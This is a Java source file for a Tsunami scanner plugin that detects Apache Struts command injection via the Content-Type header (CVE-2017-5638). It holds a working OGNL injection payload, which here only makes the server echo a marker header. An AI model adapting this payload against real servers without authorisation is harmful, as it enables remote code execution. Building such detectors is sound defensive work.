/*
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.rce.cve20175638;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.tsunami.common.net.http.HttpRequest.get;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import java.util.Optional;
import javax.inject.Inject;

/**
 * A {@link VulnDetector} that detects Apache Struts Command Injection via Content-Type header
 * (CVE-2017-5638).
 *
 * <p>A vulnerable server will use an invalid Content-Type header value as an OGNL expression which
 * is able to execute system commands under the privileges of the web server. We test it by
 * acccessing the HttpServletResponse and adding a custom header with a random value. If the header
 * is reflected in the response, then we know our code was executed.
 */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "ApacheStrutsContentTypeRceDetector",
    version = "0.1",
    description = "Tsunami detector plugin for Apache Struts Command Injection via Content-Type "
        + "header (CVE-2017-5638).",
    author = "Maciej Trzos (mtrzos@google.com)",
    bootstrapModule = ApacheStrutsContentTypeRceDetectorBootstrapModule.class)
public final class ApacheStrutsContentTypeRceDetector implements VulnDetector {

  static final String DETECTOR_HEADER_NAME = "ApacheStrutsDetectorHeader";
  static final String RANDOM_VALUE = "IhEmKCn1Lqa79o2mXmAsIzBfcMojgseiOd7srLNFlPZmzqWkRaiQNZ89mZyw";
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final String PAYLOAD_STRING_FORMAT =
      "%%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('%s','%s')}"
          + ".multipart/form-data";
  private final Clock utcClock;
  private final HttpClient httpClient;

  @Inject
  ApacheStrutsContentTypeRceDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log(
        "Starting Command Injection via Content-Type header (CVE-2017-5638) detection for Apache"
            + " Struts.");
    DetectionReportList detectionReports =
        DetectionReportList.newBuilder()
            .addAllDetectionReports(
                matchedServices.stream()
                    // TODO(b/147455416): checking web service is not needed once we enable
                    // service name filtering on this plugin.
                    .filter(NetworkServiceUtils::isWebService)
                    .filter(this::isServiceVulnerable)
                    .map(networkService -> buildDetectionReport(targetInfo, networkService))
                    .collect(toImmutableList()))
            .build();

    logger.atInfo().log(
        "ApacheStrutsContentTypeRceDetector finished, detected '%d' vulns.",
        detectionReports.getDetectionReportsCount());
    return detectionReports;
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);

    try {
      // This is a blocking call.
      String payload = String.format(PAYLOAD_STRING_FORMAT, DETECTOR_HEADER_NAME, RANDOM_VALUE);
      HttpHeaders headers = HttpHeaders.builder()
          .addHeader(CONTENT_TYPE, payload)
          .build();
      HttpResponse response =
          httpClient.send(get(targetUri).setHeaders(headers).build(), networkService);
      // If the server is vulnerable our header will be appended to the response.
      Optional<String> headerValue = response.headers().get(DETECTOR_HEADER_NAME);

      return headerValue.isPresent() && headerValue.get().equals(RANDOM_VALUE);
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
      return false;
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("GOOGLE")
                        .setValue("CVE_2017_5638"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Apache Struts Command Injection via Content-Type header (CVE-2017-5638)")
                .setDescription("Apache Struts server is vulnerable to CVE-2017-5638.")
        )
        .build();
  }
}
